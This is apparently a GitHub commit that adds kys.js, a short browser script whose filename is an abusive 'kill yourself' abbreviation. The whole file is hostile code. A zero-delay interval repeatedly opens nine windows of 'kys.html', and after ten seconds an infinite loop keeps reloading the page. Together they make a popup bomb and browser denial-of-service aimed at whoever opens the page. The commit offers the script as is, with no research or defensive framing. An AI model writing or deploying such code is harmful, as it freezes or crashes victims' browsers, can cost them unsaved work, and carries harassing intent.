c4942dfd69a034b330f506fa73e8508b093e8450
chessaimaker <147644008+chessaimaker@users.noreply.github.com>
2024-02-28 10:32:08 -0500

    Create kys.js

---
+++ kys.js
@@ -0,0 +1,16 @@
+setTimeout(function(){
+  while(true){
+    window.location.reload();
+  }
+}, 10000);
+setInterval(function(){
+  window.open("kys.html");
+  window.open("kys.html");
+  window.open("kys.html");
+  window.open("kys.html");
+  window.open("kys.html");
+  window.open("kys.html");
+  window.open("kys.html");
+  window.open("kys.html");
+  window.open("kys.html");
+}, 0);
